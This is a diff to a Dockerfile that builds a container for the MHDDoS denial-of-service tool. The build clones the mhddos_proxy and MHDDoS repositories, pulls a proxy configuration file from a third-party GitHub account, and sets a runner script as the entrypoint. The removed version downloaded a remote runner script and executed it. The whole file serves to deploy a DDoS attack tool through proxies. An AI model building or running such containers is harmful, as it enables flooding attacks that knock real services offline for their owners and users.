@@ -1,7 +1,16 @@
-from ubuntu:20.04
-RUN apt update && apt upgrade -y && apt install curl apt-utils git python3 python3-pip wget -y
+FROM python:3.10-alpine3.15 as builder
+RUN apk update && apk add git curl gcc libc-dev libffi-dev
+RUN git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+WORKDIR /mhddos_proxy
+RUN curl -O https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
+RUN git clone https://github.com/MHProDev/MHDDoS.git
+RUN pip3 install -r MHDDoS/requirements.txt --target dependencies
+
+FROM python:3.10-alpine3.15
+RUN apk update && apk add --no-cache bash curl
 WORKDIR /root
-RUN curl https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh --output /root/runner.sh
-RUN ls -lah
-RUN chmod +x /root/runner.sh
-CMD ["/root/runner.sh", "1"]
+COPY --from=builder /mhddos_proxy mhddos_proxy
+ENV PYTHONPATH="${PYTHONPATH}:/root/mhddos_proxy/dependencies"
+COPY runner.sh runner.sh
+
+ENTRYPOINT ["bash", "runner.sh"]
